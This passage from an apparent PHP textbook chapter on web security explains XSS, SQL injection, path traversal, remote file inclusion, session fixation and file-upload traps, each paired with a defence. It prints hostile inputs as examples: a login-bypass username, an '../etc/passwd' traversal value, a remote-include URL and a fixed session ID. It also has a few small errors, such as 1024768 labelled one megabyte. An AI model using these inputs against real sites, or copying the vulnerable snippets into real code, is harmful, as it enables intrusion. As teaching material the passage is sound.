 <code class="nv">$c1</code> <code class="o">=</code> <code class="nb">ord</code><code class="p">(</code><code class="nb">substr</code><code class="p">(</code><code class="nv">$c</code><code class="p">,</code> <code class="mi">0</code><code class="p">,</code> <code class="mi">1</code><code class="p">));</code>
 <code class="nv">$c2</code> <code class="o">=</code> <code class="nb">ord</code><code class="p">(</code><code class="nb">substr</code><code class="p">(</code><code class="nv">$c</code><code class="p">,</code> <code class="mi">1</code><code class="p">,</code> <code class="mi">1</code><code class="p">));</code>

 <code class="k">return</code> <code class="nv">$c2</code> <code class="o">*</code> <code class="mi">256</code> <code class="o">+</code> <code class="nv">$c1</code><code class="p">;</code>
 <code class="p">}</code>
<code class="p">}</code></pre>
</div>
</div></section>
</div></section>
<section data-type="sect1" data-pdf-bookmark="Security Vulnerabilities"><div class="sect1" id="security_vulnerabilities">
<h1>Security Vulnerabilities</h1>
<p>Now that we’ve explored the two primary safeguarding approaches, let’s turn to some of the common security vulnerabilities they seek to address.</p>
<section data-type="sect2" data-pdf-bookmark="Cross-Site Scripting"><div class="sect2" id="cross_site_scripting">
<h2>Cross-Site Scripting</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="cross-site scripting (XSS)" id="idm45922750681016"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="XSS (cross-site scripting)" id="idm45922750679848"/><a contenteditable="false" data-type="indexterm" data-primary="XSS (cross-site scripting)" id="idm45922750678456"/>Cross-site scripting (XSS) has become the most common web application security vulnerability, and with the rising popularity of Ajax technologies, XSS attacks are likely to become more advanced and to occur more frequently.</p>
<p>The term <em>cross-site scripting</em> derives from an old exploit and is no longer very descriptive or accurate for most modern attacks, and this has caused some confusion. Simply put, your code is vulnerable whenever you output data not properly escaped to the output’s context. For example:</p>
<pre data-type="programlisting" data-code-language="php"><code class="k">echo</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">];</code></pre>
<p>This is an extreme example, because <code>$_POST</code> is obviously neither filtered nor escaped, but it demonstrates the vulnerability.</p>
<p>XSS attacks are limited to only what is possible with client-side technologies. Historically, XSS has been used to capture a victim’s cookies by taking advantage of the fact that <code>document.cookie</code> contains this information.</p>
<p>In order to prevent XSS, you simply need to properly escape your output for the output context:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$html</code> <code class="o">=</code> <code class="k">array</code><code class="p">(</code>
 <code class="s1">'username'</code> <code class="o">=&gt;</code> <code class="nb">htmlentities</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">],</code> <code class="nx">ENT_QUOTES</code><code class="p">,</code> <code class="s2">"UTF-8"</code><code class="p">),</code>
<code class="p">);</code>

<code class="k">echo</code> <code class="nv">$html</code><code class="p">[</code><code class="s1">'username'</code><code class="p">];</code></pre>
<p>You should also always filter your input, which can offer a redundant safeguard in some cases (implementing redundant safeguards adheres to a security principle known as <a contenteditable="false" data-type="indexterm" data-primary="Defense in Depth principle" id="idm45922749949192"/><em>Defense in Depth</em>). For example, if you inspect a username to ensure that it’s alphabetic and also only output the filtered username, no XSS vulnerability exists. Just be sure that you don’t depend upon filtering as your primary safeguard against XSS, because it doesn’t address the root cause of the problem.</p>
</div></section>
<section data-type="sect2" data-pdf-bookmark="SQL Injection"><div class="sect2" id="sql_injection">
<h2>SQL Injection</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="databases" data-secondary="protecting" id="idm45922749945784"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="SQL injection" id="idm45922749944408"/><a contenteditable="false" data-type="indexterm" data-primary="SQL injection" id="idm45922749943032"/>The second most common web application vulnerability is SQL injection, an attack very similar to XSS. The difference is that SQL injection vulnerabilities exist wherever you use unescaped data in an SQL query. (If these names were more consistent, XSS would probably be called “HTML injection.”)</p>
<p>The following example demonstrates an SQL injection vulnerability:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$hash</code> <code class="o">=</code> <code class="nb">hash</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'password'</code><code class="p">]);</code>

<code class="nv">$sql</code> <code class="o">=</code> <code class="s2">"SELECT count(*) FROM users</code>
<code class="s2"> WHERE username = '</code><code class="si">{</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code><code class="si">}</code><code class="s2">' AND password = '</code><code class="si">{</code><code class="nv">$hash</code><code class="si">}</code><code class="s2">'"</code><code class="p">;</code>

<code class="nv">$result</code> <code class="o">=</code> <code class="nb">mysql_query</code><code class="p">(</code><code class="nv">$sql</code><code class="p">);</code></pre>
<p>The problem is that if the username is not escaped, its value can manipulate the format of the SQL query. Because this particular vulnerability is so common, many attackers try usernames such as the following when trying to log in to a target site:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nx">chris</code><code class="err">'</code> <code class="o">--</code></pre>
<p>Attackers love this username, because it allows access to the account with the username <code>chris'</code> without them having to know that account’s password. After interpolation, the SQL query becomes:</p>
<pre data-type="programlisting" data-code-language="sql"><code class="k">SELECT</code> <code class="k">count</code><code class="p">(</code><code class="o">*</code><code class="p">)</code>
<code class="k">FROM</code> <code class="n">users</code>
<code class="k">WHERE</code> <code class="n">username</code> <code class="o">=</code> <code class="s1">'chris'</code> <code class="c1">--'</code>
<code class="k">AND</code> <code class="n">password</code> <code class="o">=</code> <code class="s1">'...'</code><code class="err">"</code><code class="p">;</code></pre>
<p>Because two consecutive hyphens (<code>--</code>) indicate the beginning of an SQL comment, this query is identical to:</p>
<pre data-type="programlisting" data-code-language="sql"><code class="k">SELECT</code> <code class="k">count</code><code class="p">(</code><code class="o">*</code><code class="p">)</code>
<code class="k">FROM</code> <code class="n">users</code>
<code class="k">WHERE</code> <code class="n">username</code> <code class="o">=</code> <code class="s1">'chris'</code></pre>
<p>If the code containing this snippet of code assumes a successful login when <code>$result</code> is nonzero, this SQL injection would allow an attacker to log in to any account without having to know or guess the password.</p>
<p>Safeguarding your applications against SQL injection is primarily accomplished by escaping output:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$mysql</code> <code class="o">=</code> <code class="k">array</code><code class="p">();</code>

<code class="nv">$hash</code> <code class="o">=</code> <code class="nb">hash</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'password'</code><code class="p">]);</code>
<code class="nv">$mysql</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code> <code class="o">=</code> <code class="nb">mysql_real_escape_string</code><code class="p">(</code><code class="nv">$clean</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]);</code>

<code class="nv">$sql</code> <code class="o">=</code> <code class="s2">"SELECT count(*) FROM users</code>
<code class="s2"> WHERE username = '</code><code class="si">{</code><code class="nv">$mysql</code><code class="p">[</code><code class="s1">'username'</code><code class="p">]</code><code class="si">}</code><code class="s2">' AND password = '</code><code class="si">{</code><code class="nv">$hash</code><code class="si">}</code><code class="s2">'"</code><code class="p">;</code>

<code class="nv">$result</code> <code class="o">=</code> <code class="nb">mysql_query</code><code class="p">(</code><code class="nv">$sql</code><code class="p">);</code></pre>
<p>However, this only ensures that the data you escape is interpreted as data. You still need to filter data because characters like the percent sign (<code>%</code>) have a special meaning in SQL but don’t need to be escaped.</p>
<p>The best protection against SQL injection is the use of <a contenteditable="false" data-type="indexterm" data-primary="bound parameters, for SQL protection" id="idm45922749675480"/><em>bound parameters</em>. The following example demonstrates the use of bound parameters with PHP’s PDO extension and an Oracle database:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$sql</code> <code class="o">=</code> <code class="nv">$db</code><code class="o">-&gt;</code><code class="na">prepare</code><code class="p">(</code><code class="s2">"SELECT count(*) FROM users</code>
<code class="s2"> WHERE username = :username AND password = :hash"</code><code class="p">);</code>

<code class="nv">$sql</code><code class="o">-&gt;</code><code class="na">bindParam</code><code class="p">(</code><code class="s2">":username"</code><code class="p">,</code> <code class="nv">$clean</code><code class="p">[</code><code class="s1">'username'</code><code class="p">],</code> <code class="nx">PDO</code><code class="o">::</code><code class="na">PARAM_STRING</code><code class="p">,</code> <code class="mi">32</code><code class="p">);</code>
<code class="nv">$sql</code><code class="o">-&gt;</code><code class="na">bindParam</code><code class="p">(</code><code class="s2">":hash"</code><code class="p">,</code> <code class="nb">hash</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'password'</code><code class="p">]),</code> <code class="nx">PDO</code><code class="o">::</code><code class="na">PARAM_STRING</code><code class="p">,</code> <code class="mi">32</code><code class="p">);</code></pre>
<p>Because bound parameters ensure that the data never enters a context where it can be considered anything but data (i.e., it’s never misinterpreted), no escaping of the username and password is necessary.</p>
</div></section>
<section data-type="sect2" data-pdf-bookmark="Filename Vulnerabilities"><div class="sect2" id="filename_vulnerabilities">
<h2>Filename Vulnerabilities</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="filenames" data-secondary="security vulnerability" id="ix_filenames_security"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="filename vulnerabilities" id="ix_security_filenames"/>It’s fairly easy to construct a filename that refers to something other than what you intended. For example, say you have a <code>$username</code> variable that contains the name the user wants to be called, which the user has specified through a form field. Now let’s say you want to store a welcome message for each user in the directory <em>/usr/local/lib/greetings</em> so that you can output the message any time the user logs in to your application. The code to print the current user’s greeting is:</p>
<pre data-type="programlisting" data-code-language="php"><code class="k">include</code><code class="p">(</code><code class="s2">"/usr/local/lib/greetings/</code><code class="si">{</code><code class="nv">$username</code><code class="si">}</code><code class="s2">"</code><code class="p">);</code></pre>
<p>This seems harmless enough, but what if the user chose the username <code>"../../../../etc/passwd"</code>? The code to include the greeting now includes this relative path instead: <em>/etc/passwd</em>. Relative paths are a common trick used by hackers against unsuspecting scripts.</p>
<p>Another trap for the unwary programmer lies in the way that, by default, PHP can open remote files with the same functions that open local files. The <a contenteditable="false" data-type="indexterm" data-primary="fopen function" id="idm45922749523336"/><code>fopen()</code> function and anything that uses it—such as <a contenteditable="false" data-type="indexterm" data-primary="include function" id="idm45922749521944"/><code>include()</code> and <a contenteditable="false" data-type="indexterm" data-primary="require function" id="idm45922749450280"/><code>require()</code>—can be passed an HTTP or FTP URL as a filename, and the document identified by the URL will be opened. For example:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nb">chdir</code><code class="p">(</code><code class="s2">"/usr/local/lib/greetings"</code><code class="p">);</code>
<code class="nv">$fp</code> <code class="o">=</code> <code class="nb">fopen</code><code class="p">(</code><code class="nv">$username</code><code class="p">,</code> <code class="s1">'r'</code><code class="p">);</code></pre>
<p>If <code>$username</code> is set to <em>https://www.example.com/myfile</em>, a remote file is opened, not a local one.</p>
<p>The situation is even worse if you let the user tell you which file to <code>include()</code>:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$file</code> <code class="o">=</code> <code class="nv">$_REQUEST</code><code class="p">[</code><code class="s1">'theme'</code><code class="p">];</code>
<code class="k">include</code><code class="p">(</code><code class="nv">$file</code><code class="p">);</code></pre>
<p>If the user passes a <code>theme</code> parameter of <em>https://www.example.com/badcode.inc</em> and your <code>variables_order</code> includes <code>GET</code> or <code>POST</code>, your PHP script will happily load and run the remote code. Never use parameters as filenames like this.</p>
<p>There are several solutions to the problem of checking filenames. You can disable remote file access, check filenames with <code>realpath()</code> and <code>basename()</code> (as described next), and use the <code>open_basedir</code> option to restrict filesystem access outside your site’s document root.</p>
<section data-type="sect3" data-pdf-bookmark="Check for relative paths"><div class="sect3" id="check_for_relative_paths">
<h3>Check for relative paths</h3>
<p>When you need to allow the user to specify a filename in your application, you can use a combination of the <a contenteditable="false" data-type="indexterm" data-primary="realpath function" id="idm45922749381320"/><a contenteditable="false" data-type="indexterm" data-primary="basename function" id="idm45922749380328"/><code>realpath()</code> and <code>basename()</code> functions to ensure that the filename is what it ought to be. The <code>realpath()</code> function resolves special markers (such as <code>.</code> and <code>..</code>). After a call to <code>realpath()</code>, the resulting path is a full path on which you can then use <code>basename()</code>. The <code>basename()</code> function returns just the filename portion of the path.</p>
<p>Going back to our welcome message scenario, here’s an example of <code>realpath()</code> and <code>basename()</code> in action:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$filename</code> <code class="o">=</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">];</code>
<code class="nv">$vetted</code> <code class="o">=</code> <code class="nb">basename</code><code class="p">(</code><code class="nb">realpath</code><code class="p">(</code><code class="nv">$filename</code><code class="p">));</code>

<code class="k">if</code> <code class="p">(</code><code class="nv">$filename</code> <code class="o">!==</code> <code class="nv">$vetted</code><code class="p">)</code> <code class="p">{</code>
 <code class="k">die</code><code class="p">(</code><code class="s2">"</code><code class="si">{</code><code class="nv">$filename</code><code class="si">}</code><code class="s2"> is not a good username"</code><code class="p">);</code>
<code class="p">}</code></pre>
<p>In this case, we’ve resolved <code>$filename</code> to its full path and then extracted just the filename. If this value doesn’t match the original value of <code>$filename</code>, we’ve got a bad filename that we don’t want to use.</p>
<p>Once you have the completely bare filename, you can reconstruct what the file path ought to be, based on where legal files should go, and add a file extension based on the actual contents of the file:<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_security_filenames" id="idm45922749637864"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_filenames_security" id="idm45922749636552"/></p>
<pre data-type="programlisting" data-code-language="php"><code class="k">include</code><code class="p">(</code><code class="s2">"/usr/local/lib/greetings/</code><code class="si">{</code><code class="nv">$filename</code><code class="si">}</code><code class="s2">"</code><code class="p">);</code></pre>
</div></section>
</div></section>
<section data-type="sect2" data-pdf-bookmark="Session Fixation"><div class="sect2" id="session_fixation">
<h2>Session Fixation</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="session fixation" id="idm45922749629000"/><a contenteditable="false" data-type="indexterm" data-primary="session fixation" id="idm45922749627624"/>A very popular attack that targets sessions is session fixation. The primary reason behind its popularity is that it’s the easiest method by which an attacker can obtain a valid session identifier. As such, it is intended as a stepping-stone to a session hijacking attack, in which an attacker impersonates a user by presenting the user’s session identifier.</p>
<p>Session fixation is any approach that causes a victim to use a session identifier chosen by an attacker. The simplest example is a link with an embedded session identifier:</p>
<pre data-type="programlisting" data-code-language="html+php"><code class="nt">&lt;a</code> <code class="na">href=</code><code class="s">"http://host/login.php?PHPSESSID=1234"</code><code class="nt">&gt;</code>Log In<code class="nt">&lt;/a&gt;</code></pre>
<p>A victim who clicks this link will resume the session identified as <code>1234</code>, and if the victim proceeds to log in, the attacker can hijack the victim’s session to escalate the level of privilege.</p>
<p>There are a few variants of this attack, including some that use cookies for this same purpose. Luckily, the safeguard is simple, straightforward, and consistent. Whenever there is a change in the level of privilege, such as when a user logs in, regenerate the session identifier with <a contenteditable="false" data-type="indexterm" data-primary="session_regenerate_id function" id="idm45922749592072"/><code>session_regenerate_id()</code>:</p>
<pre data-type="programlisting" data-code-language="php"><code class="k">if</code> <code class="p">(</code><code class="nx">check_auth</code><code class="p">(</code><code class="nv">$_POST</code><code class="p">[</code><code class="s1">'username'</code><code class="p">],</code> <code class="nv">$_POST</code><code class="p">[</code><code class="s1">'password'</code><code class="p">]))</code> <code class="p">{</code>
 <code class="nv">$_SESSION</code><code class="p">[</code><code class="s1">'auth'</code><code class="p">]</code> <code class="o">=</code> <code class="k">TRUE</code><code class="p">;</code>
 <code class="nb">session_regenerate_id</code><code class="p">(</code><code class="k">TRUE</code><code class="p">);</code>
<code class="p">}</code></pre>
<p>This effectively prevents session fixation attacks by ensuring that any user who logs in (or otherwise escalates the privilege level in any way) is assigned a fresh, random session identifier.</p>
</div></section>
<section data-type="sect2" data-pdf-bookmark="File Upload Traps"><div class="sect2" id="file_upload_traps">
<h2>File Upload Traps</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="file uploads" id="ix_file_upload_traps"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="file upload traps" id="ix_security_file_upload"/>File uploads combine two dangers we’ve already discussed: user-modifiable data and the filesystem. While PHP 7 itself is secure in how it handles uploaded files, there are several potential traps for unwary programmers.</p>
<section data-type="sect3" data-pdf-bookmark="Distrust browser-supplied filenames"><div class="sect3" id="distrust_browser_supplied_filenames">
<h3>Distrust browser-supplied filenames</h3>
<p>Be careful using the filename sent by the browser. If possible, do not use it as the name of the file on your filesystem. It’s easy to make the browser send a file identified as <em>/etc/passwd</em> or <em>/home/kevin/.forward</em>. You can use the browser-supplied name for all user interaction, but generate a unique name yourself to actually call the file. For example:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$browserName</code> <code class="o">=</code> <code class="nv">$_FILES</code><code class="p">[</code><code class="s1">'image'</code><code class="p">][</code><code class="s1">'name'</code><code class="p">];</code>
<code class="nv">$tempName</code> <code class="o">=</code> <code class="nv">$_FILES</code><code class="p">[</code><code class="s1">'image'</code><code class="p">][</code><code class="s1">'tmp_name'</code><code class="p">];</code>

<code class="k">echo</code> <code class="s2">"Thanks for sending me </code><code class="si">{</code><code class="nv">$browserName</code><code class="si">}</code><code class="s2">."</code><code class="p">;</code>

<code class="nv">$counter</code><code class="o">++</code><code class="p">;</code> <code class="c1">// persistent variable</code>
<code class="nv">$filename</code> <code class="o">=</code> <code class="s2">"image_</code><code class="si">{</code><code class="nv">$counter</code><code class="si">}</code><code class="s2">"</code><code class="p">;</code>

<code class="k">if</code> <code class="p">(</code><code class="nb">is_uploaded_file</code><code class="p">(</code><code class="nv">$tempName</code><code class="p">))</code> <code class="p">{</code>
 <code class="nb">move_uploaded_file</code><code class="p">(</code><code class="nv">$tempName</code><code class="p">,</code> <code class="s2">"/web/images/</code><code class="si">{</code><code class="nv">$filename</code><code class="si">}</code><code class="s2">"</code><code class="p">);</code>
<code class="p">}</code>
<code class="k">else</code> <code class="p">{</code>
 <code class="k">die</code><code class="p">(</code><code class="s2">"There was a problem processing the file."</code><code class="p">);</code>
<code class="p">}</code></pre>
</div></section>
<section data-type="sect3" data-pdf-bookmark="Beware of filling your filesystem"><div class="sect3" id="beware_of_filling_your_filesystem">
<h3>Beware of filling your filesystem</h3>
<p>Another trap is the size of uploaded files. Although you can tell the browser the maximum size of file to upload, this is only a recommendation and does not ensure your script won’t be handed a file of a larger size. Attackers can perform a denial-of-service attack by sending files large enough to fill up your server’s filesystem.</p>
<p>Set the <a contenteditable="false" data-type="indexterm" data-primary="post_max_size option, php.ini file" id="idm45922748965048"/><a contenteditable="false" data-type="indexterm" data-primary="php.ini file" data-secondary="post_max_size option" id="idm45922748963944"/><code>post_max_size</code> configuration option in <em>php.ini</em> to the maximum size (in bytes) that you want:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nx">post_max_size</code> <code class="o">=</code> <code class="mi">1024768</code><code class="p">;</code> <code class="c1">// one megabyte</code></pre>
<p>PHP will ignore requests with data payloads larger than this size. The default 10 MB is probably larger than most sites require.</p>
</div></section>
<section data-type="sect3" data-pdf-bookmark="Account for EGPCS settings"><div class="sect3" id="account_for_egpcs_settings">
<h3>Account for EGPCS settings</h3>
<p><a contenteditable="false" data-type="indexterm" data-primary="EGPCS (environment, GET, POST, cookies, server)" id="idm45922748958056"/>The default <code>variables_order</code> (EGPCS: environment, <code>GET</code>, <code>POST</code>, cookie, server) processes <code>GET</code> and <code>POST</code> parameters before cookies. This makes it possible for the user to send a cookie that overwrites the global variable you think contains information on your uploaded file. To avoid being tricked like this, check that the given file was actually an uploaded file using the <a contenteditable="false" data-type="indexterm" data-primary="is_uploaded_file function" id="idm45922748952584"/><code>is_uploaded_file()</code> function. For example:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$uploadFilepath</code> <code class="o">=</code> <code class="nv">$_FILES</code><code class="p">[</code><code class="s1">'uploaded'</code><code class="p">][</code><code class="s1">'tmp_name'</code><code class="p">];</code>

<code class="k">if</code> <code class="p">(</code><code class="nb">is_uploaded_file</code><code class="p">(</code><code class="nv">$uploadFilepath</code><code class="p">))</code> <code class="p">{</code>
 <code class="nv">$fp</code> <code class="o">=</code> <code class="nb">fopen</code><code class="p">(</code><code class="nv">$uploadFilepath</code><code class="p">,</code> <code class="s1">'r'</code><code class="p">);</code>

 <code class="k">if</code> <code class="p">(</code><code class="nv">$fp</code><code class="p">)</code> <code class="p">{</code>
 <code class="nv">$text</code> <code class="o">=</code> <code class="nb">fread</code><code class="p">(</code><code class="nv">$fp</code><code class="p">,</code> <code class="nb">filesize</code><code class="p">(</code><code class="nv">$uploadFilepath</code><code class="p">));</code>
 <code class="nb">fclose</code><code class="p">(</code><code class="nv">$fp</code><code class="p">);</code>

 <code class="c1">// do something with the file's contents</code>
 <code class="p">}</code>
<code class="p">}</code></pre>
<p>PHP provides a <a contenteditable="false" data-type="indexterm" data-primary="move_uploaded_file function" id="idm45922749034968"/><code>move_uploaded_file()</code> function that moves the file only if it was an uploaded file. This is preferable to moving the file directly with a system-level function or PHP’s <code>copy()</code> function. For example, the following code cannot be fooled by cookies:<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_security_file_upload" id="idm45922749014424"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_file_upload_traps" id="idm45922749013048"/></p>
<pre data-type="programlisting" data-code-language="php"><code class="nb">move_uploaded_file</code><code class="p">(</code><code class="nv">$_REQUEST</code><code class="p">[</code><code class="s1">'file'</code><code class="p">],</code> <code class="s2">"/new/name.txt"</code><code class="p">);</code></pre>
</div></section>
</div></section>
<section data-type="sect2" data-pdf-bookmark="Unauthorized File Access"><div class="sect2" id="unauthorized_file_access">
<h2>Unauthorized File Access</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="unauthorized file access, preventing" id="ix_unauth_access_security"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="unauthorized file access" id="ix_security_unauth_access"/>If only you and people you trust can log in to your web server, you don’t need to worry about file permissions for files used by or created by your PHP programs. However, most websites are hosted on an ISP’s machines, and there’s a risk that nontrusted users can read files that your PHP program creates. There are a number of techniques that you can use to deal with file permissions issues.</p>
<section data-type="sect3" data-pdf-bookmark="Restrict filesystem access to a specific directory"><div class="sect3" id="restrict_filesystem_access_to_a_specifi">
<h3>Restrict filesystem access to a specific directory</h3>
<p>You can set the <a contenteditable="false" data-type="indexterm" data-primary="open_basedir option, php.ini file" id="idm45922749126216"/><a contenteditable="false" data-type="indexterm" data-primary="php.ini file" data-secondary="open_basedir option" id="idm45922749125064"/><code>open_basedir</code> option to restrict access from your PHP scripts to a specific directory. If <code>open_basedir</code> is set in your <em>php.ini</em>, PHP limits filesystem and I/O functions so that they can operate only within that directory or any of its subdirectories. For example:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nx">open_basedir</code> <code class="o">=</code> <code class="o">/</code><code class="nx">some</code><code class="o">/</code><code class="nx">path</code></pre>
<p>With this configuration in effect, the following function calls succeed:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nb">unlink</code><code class="p">(</code><code class="s2">"/some/path/unwanted.exe"</code><code class="p">);</code>
<code class="k">include</code><code class="p">(</code><code class="s2">"/some/path/less/travelled.inc"</code><code class="p">);</code></pre>
<p>But these generate runtime errors:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$fp</code> <code class="o">=</code> <code class="nb">fopen</code><code class="p">(</code><code class="s2">"/some/other/file.exe"</code><code class="p">,</code> <code class="s1">'r'</code><code class="p">);</code>
<code class="nv">$dp</code> <code class="o">=</code> <code class="nb">opendir</code><code class="p">(</code><code class="s2">"/some/path/../other/file.exe"</code><code class="p">);</code></pre>
<p>Of course, one web server can run many applications, and each application typically stores files in its own directory. You can configure <code>open_basedir</code> on a per-virtual-host basis in your <em>httpd.conf</em> file like this:</p>
<pre data-type="programlisting">&lt;VirtualHost 1.2.3.4&gt;
 ServerName domainA.com
 DocumentRoot /web/sites/domainA
 php_admin_value open_basedir /web/sites/domainA
&lt;/VirtualHost&gt;</pre>
<p>Similarly, you can configure it per directory or per URL in <em>httpd.conf</em>:</p>
<pre data-type="programlisting"># by directory
&lt;Directory /home/httpd/html/app1&gt;
 php_admin_value open_basedir /home/httpd/html/app1
&lt;/Directory&gt;

# by URL
&lt;Location /app2&gt;
 php_admin_value open_basedir /home/httpd/html/app2
&lt;/Location&gt;</pre>
<p>The <code>open_basedir</code> directory can be set only in the <em>httpd.conf</em> file, not in .<em>htaccess</em> files, and you must use <code>php_admin_value</code> to set it.</p>
</div></section>
<section data-type="sect3" data-pdf-bookmark="Get permissions right the first time"><div class="sect3" id="get_permissions_right_the_first_time">
<h3>Get permissions right the first time</h3>
<p><a contenteditable="false" data-type="indexterm" data-primary="files" data-secondary="permissions for" id="idm45922748846568"/>Do not create a file and then change its permissions. This creates a <em>race condition</em>, where a lucky user can open the file once it’s created but before it’s locked down. Instead, use the <a contenteditable="false" data-type="indexterm" data-primary="umask function" id="idm45922748844520"/><code>umask()</code> function to strip off unnecessary permissions. For example:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nb">umask</code><code class="p">(</code><code class="mo">077</code><code class="p">);</code> <code class="c1">// disable ---rwxrwx</code>
<code class="nv">$fh</code> <code class="o">=</code> <code class="nb">fopen</code><code class="p">(</code><code class="s2">"/tmp/myfile"</code><code class="p">,</code> <code class="s1">'w'</code><code class="p">);</code></pre>
<p>By default, the <a contenteditable="false" data-type="indexterm" data-primary="fopen function" id="idm45922748832440"/><code>fopen()</code> function attempts to create a file with permission 0666 (<code>rw-rw-rw-</code>). Calling <code>umask()</code> first disables the group and other bits, leaving only 0600 (<code>rw-------</code>). Now, when <code>fopen()</code> is called, the file is created with those permissions.</p>
</div></section>
<section data-type="sect3" data-pdf-bookmark="Don’t use files"><div class="sect3" id="donapostrophet_use_files">
<h3>Don’t use files</h3>
<p><a contenteditable="false" data-type="indexterm" data-primary="files" data-secondary="database as alternative to" data-secondary-sortas="alternative to" id="idm45922748805448"/><a contenteditable="false" data-type="indexterm" data-primary="databases" data-secondary="as alternative to files" data-secondary-sortas="alternative" id="idm45922748803832"/>Because all scripts running on a machine run as the same user, a file that one script creates can be read by another, regardless of which user wrote the script. All a script needs to know to read a file is the name of that file.</p>
<p>There is no way to change this, so the best solution is to not use files to store data that should be protected; the most secure place to store data is in a database.</p>
<p>A complex workaround is to run a separate Apache daemon for each user. If you add a reverse proxy such as <em>haproxy</em> in front of the pool of Apache instances, you may be able to serve 100+ users on a single machine. Few sites do this, however, because the complexity and cost are much greater than those for the typical situation, where one Apache daemon can serve web pages for thousands of users.</p>
</div></section>
<section data-type="sect3" data-pdf-bookmark="Protect session files"><div class="sect3" id="protect_session_files">
<h3>Protect session files</h3>
<p><a contenteditable="false" data-type="indexterm" data-primary="files" data-secondary="session files, protecting" id="idm45922748798120"/><a contenteditable="false" data-type="indexterm" data-primary="session files, protecting" id="idm45922748796776"/>With PHP’s built-in session support, session information is stored in files. Each file is named <code>/tmp/sess_<em>id</em></code>, where <em><code>id</code></em> is the name of the session and is owned by the web server user ID, usually <code>nobody</code>.</p>
<p>Because all PHP scripts run as the same user through the web server, this means that any PHP script hosted on a server can read any session files for any other PHP site. In situations where your PHP code is stored on an ISP’s server that is shared with other users’ PHP scripts, variables you store in your sessions are visible to other PHP scripts.</p>
<p>Even worse, other users on the server can create files in the session directory <em>/tmp</em>. There’s nothing preventing attackers from creating a fake session file that has any variables and values they want in it. They can then have the browser send your script a cookie containing the name of the faked session, and your script will happily load the variables stored in the fake session file.</p>
<p>One workaround is to ask your service provider to configure their server to place your session files in your own directory. Typically, this means that your <code>VirtualHost</code> block in the Apache <em>httpd.conf</em> file will contain:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nx">php_value</code> <code class="nx">session</code><code class="o">.</code><code class="nx">save_path</code> <code class="o">/</code><code class="nx">some</code><code class="o">/</code><code class="nx">path</code></pre>
<p>If you have <em>.htaccess</em> capabilities on your server and Apache is configured to let you override options, you can make the change yourself.</p>
</div></section>
<section data-type="sect3" data-pdf-bookmark="Conceal PHP libraries"><div class="sect3" id="conceal_php_libraries">
<h3>Conceal PHP libraries</h3>
<p><a contenteditable="false" data-type="indexterm" data-primary="extensions (libraries)" data-secondary="concealing" id="idm45922748777336"/>Many a hacker has learned of weaknesses by downloading include files or data that is stored alongside HTML and PHP files in the web server’s document root. To prevent this from happening to you, all you need to do is store code libraries and data outside the server’s document root.</p>
<p>For example, if the document root is <em>/home/httpd/html</em>, everything below that directory can be downloaded through a URL. It is a simple matter to put your library code, configuration files, logfiles, and other data outside that directory (e.g., in <em>/usr/local/lib/myapp</em>). This doesn’t prevent other users on the web server from accessing those files (see <a data-type="xref" href="#donapostrophet_use_files">“Don’t use files”</a>), but it does prevent the files from being downloaded by remote users.</p>
<p>If you must store these auxiliary files in your document root, you should configure the web server to deny requests for those files. For example, this tells Apache to deny requests for any file with the <em>.inc</em> extension, a common extension for PHP include files:</p>
<pre data-type="programlisting" data-code-language="html+php"><code class="nt">&lt;Files</code> <code class="err">~</code> <code class="err">"\.</code><code class="na">inc</code><code class="err">$"</code><code class="nt">&gt;</code>
 Order allow,deny
 Deny from all
<code class="nt">&lt;/Files&gt;</code></pre>
<p>A better and more preferred way to prevent downloading of PHP source files is to always use the <em>.php</em> extension.</p>
<p>If you store code libraries in a different directory from the PHP pages that use them, you’ll need to tell PHP where the libraries are. Either give a path to the code in each <code>include()</code> or <code>require()</code>, or change <code>include_path</code> in <em>php.ini</em>:<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_security_unauth_access" id="idm45922748759960"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_unauth_access_security" id="idm45922748767064"/></p>
<pre data-type="programlisting" data-code-language="php"><code class="nx">include_path</code> <code class="o">=</code> <code class="s2">".:/usr/local/php:/usr/local/lib/myapp"</code><code class="p">;</code></pre>
</div></section>
</div></section>
